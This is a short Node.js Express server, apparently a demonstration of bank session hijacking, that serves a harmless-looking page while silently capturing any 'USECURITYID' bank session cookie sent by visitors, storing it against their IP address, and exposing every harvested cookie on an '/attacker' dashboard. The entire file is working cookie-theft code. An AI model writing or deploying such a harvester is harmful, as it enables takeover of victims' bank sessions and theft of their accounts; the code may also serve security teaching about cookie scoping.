var express = require('express');
var app = express();
app.set('view engine', 'pug');

var dirty = require('dirty');
var keyValue = dirty('');

app.use(express.static('public'));

keyValue.on('load', function () {
    console.log("Dirty key value store is loaded.");
});

// Index route
app.get('/', function (req, res) {
    var cookiesList = {},
        rc = req.headers.cookie;

    // Split up all cookies and build up a list
    rc && rc.split(';').forEach(function (cookie) {
        var parts = cookie.split('=');
        cookiesList[parts.shift().trim()] = decodeURI(parts.join('='));
    });

    if (cookiesList.USECURITYID) {
        keyValue.set(req.connection.remoteAddress, {
            cookie: cookiesList.USECURITYID
        }, function () {
            console.log("Added a new bank session cookie! (" + cookiesList.USECURITYID + ")");
        });
    }

    res.render('index', {
        title: 'Fancy pug page'
    })
});

// Attacker route
app.get('/attacker', function (req, res) {
    var loggedCookies = [];

    keyValue.forEach(function (key, val) {
        loggedCookies.push({
            ip: key,
            cookie: val.cookie
        });
    });

    res.render('attacker', {
        title: 'Fancy pug - Attacker page',
        message: 'Welcome Attacker',
        cookies: loggedCookies
    })
});
var server = app.listen(3000, function () {});
console.log("Server started on http://localhost:3000");